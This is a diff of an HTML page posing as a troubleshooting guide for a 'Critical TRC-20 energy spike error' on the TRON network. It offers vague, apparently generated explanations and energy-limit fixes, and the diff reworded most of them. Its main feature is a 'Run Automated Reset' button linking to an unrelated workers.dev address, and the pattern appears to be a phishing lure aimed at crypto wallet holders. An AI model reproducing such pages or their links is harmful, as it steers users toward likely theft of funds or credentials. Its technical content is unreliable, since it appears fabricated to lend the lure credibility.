@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,36 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Critical TRC-20 energy spike error" when attempting to execute smart contracts or perform transactions on the TRON network, resulting in failed transactions and potential loss of assets.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unexpected surge in energy consumption for TRC-20 token transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 tokens, exceeding the allocated energy limits for user accounts, causing the network to reject transactions to prevent overload.</li>
+<li>This error occurs due to an imbalance in the energy allocation for smart contracts, often caused by inefficient code or an unexpected increase in transaction volume, leading to a rapid depletion of available energy.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the energy limit for the user account using the <code>tronweb</code> interface.</li>
-<li>Configure the TRON node to allow for dynamic energy allocation using the following code block:</li>
+<li>Adjust the energy limit for the smart contract to prevent excessive energy consumption:</li>
+<li>Increase the <code>energy_limit</code> parameter in the contract deployment script</li>
+<li>Implement energy-efficient coding practices to reduce consumption</li>
+<li>Monitor and analyze energy usage patterns to identify areas for optimization</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="o">{</span>
-<span class="w">  </span><span class="s2">&quot;energy&quot;</span>:<span class="w"> </span><span class="o">{</span>
-<span class="w">    </span><span class="s2">&quot;limit&quot;</span>:<span class="w"> </span><span class="m">10000</span>,
-<span class="w">    </span><span class="s2">&quot;dynamic&quot;</span>:<span class="w"> </span><span class="nb">true</span>
+<div class="codehilite"><pre><span></span><code>tronweb.tx.buildTransaction<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;contract_address&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;function_selector&quot;</span>,
+<span class="w">  </span><span class="o">[</span><span class="s2">&quot;parameter1&quot;</span>,<span class="w"> </span><span class="s2">&quot;parameter2&quot;</span><span class="o">]</span>,
+<span class="w">  </span><span class="o">{</span>
+<span class="w">    </span>feeLimit:<span class="w"> </span><span class="m">100000000</span>,
+<span class="w">    </span>energyLimit:<span class="w"> </span><span class="m">100000</span>
 <span class="w">  </span><span class="o">}</span>
-<span class="o">}</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<ul>
-<li>Utilize the <code>tron-console</code> command-line tool to manually adjust energy parameters for specific accounts.</li>
-</ul>
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TRON network and its energy mechanics</li>
-<li>Access to the TRON node configuration files</li>
-<li>Familiarity with the <code>tronweb</code> and <code>tron-console</code> tools</li>
+<li>Basic understanding of TRON network and TRC-20 tokens</li>
+<li>Familiarity with smart contract development and deployment</li>
+<li>Access to the TRONWeb library and a compatible code editor</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
